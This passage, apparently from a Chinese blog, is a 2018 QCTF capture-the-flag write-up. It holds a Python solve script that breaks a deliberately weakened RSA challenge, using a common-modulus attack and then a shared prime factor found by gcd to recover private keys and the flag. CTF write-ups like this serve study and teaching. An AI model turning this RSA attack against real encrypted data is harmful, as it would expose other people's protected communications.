<p>代码看完后，思路是先用共模攻击解出 <code>n1</code>，之后利用公约数得到 <code>p1</code>、<code>p2</code>、<code>p3</code>，再求出 <code>d1</code>、<code>d2</code>，最后解出 <code>msg1</code>、<code>msg2</code>。给出的文件中，<code>ciphertext</code> 为第二次输出的 <code>c1</code> 和 <code>c2</code>，<code>n1.encrypted</code> 为第二次输出的 <code>c1</code> 和 <code>c2</code>，<code>n2&amp;n3</code>即最后输出的被加密后的<code>n2</code>和<code>n3</code>。解密脚本如下：</p>
<pre><code class="python">#!/usr/bin/env python
import base64
import gmpy2
f = open(&#39;n2&amp;n3&#39;, &#39;rb&#39;)
n2 = f.readline()
n3 = f.readline()
f.close()
n2 = base64.b64decode(n2).encode(&#39;hex&#39;)
n3 = base64.b64decode(n3).encode(&#39;hex&#39;)
n2 = int(n2, 16)
n3 = int(n3, 16)
# print &#39;n2:&#39;, n2
# print &#39;n3:&#39;, n3
# first step: solve n1
e1 = 0x1001
e2 = 0x101
f = open(&#39;n1.encrypted&#39;, &#39;rb&#39;)
n1_c1 = f.readline()
n1_c2 = f.readline()
f.close()
n1_c1 = int(n1_c1, 16)
n1_c2 = int(n1_c2, 16)
# print &#39;n1_c1:&#39;, n1_c1
# print &#39;n1_c2:&#39;, n1_c2
gcd, s, t = gmpy2.gcdext(e1, e2)
if s &lt; 0:
    s = abs(s)
    n1_c1 = gmpy2.invert(n1_c1, n3)
if t &lt; 0:
    t = abs(t)
    n1_c2 = gmpy2.invert(n1_c2, n3)
n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3
print &#39;n1:&#39;, n1
# second step: solve flag
f = open(&#39;ciphertext&#39;, &#39;rb&#39;)
c1 = f.readline()
c2 = f.readline()
f.close()
c1 = int(c1, 16)
c2 = int(c2, 16)
print &#39;c1:&#39;, c1
print &#39;c2:&#39;, c2
e = 0x1001
p1 = gmpy2.gcd(n1, n2)
p2 = n1 / p1
p3 = n2 / p1
d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))
d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))
m1 = pow(c1, d1, n1)
m2 = pow(c2, d2, n2)
msg1 = hex(m1)[2:].decode(&#39;hex&#39;)
msg2 = hex(m2)[2:].decode(&#39;hex&#39;)
flag = &#39;&#39;
for i in range(len(msg1 + msg2)):
    if i % 2 == 0:
        flag += msg1[i / 2]
    else:
        flag += msg2[i / 2]
print &#39;flag:&#39;, flag
</code></pre>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/</a><br><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a><br><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/</a><br><a href="https://www.xmsec.cc/stackoverflow-ropbasic/" target="_blank" rel="noopener">https://www.xmsec.cc/stackoverflow-ropbasic/</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81080580" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81080580</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81064079" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81064079</a><br><a href="http://www.freebuf.com/column/177864.html" target="_blank" rel="noopener">http://www.freebuf.com/column/177864.html</a><br><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</a><br><a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">http://www.cnblogs.com/semishigure/p/9318258.html</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/81137057" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/81137057</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2018/08/11/2018-XMan个人排位赛/">
                        <i class="fa fa-chevron-left"></i>
                        <span>2018-XMan个人排位赛</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2018/07/11/PWN入门（三）/">
                        <span>PWN入门（三）</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "2018-QCTF&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
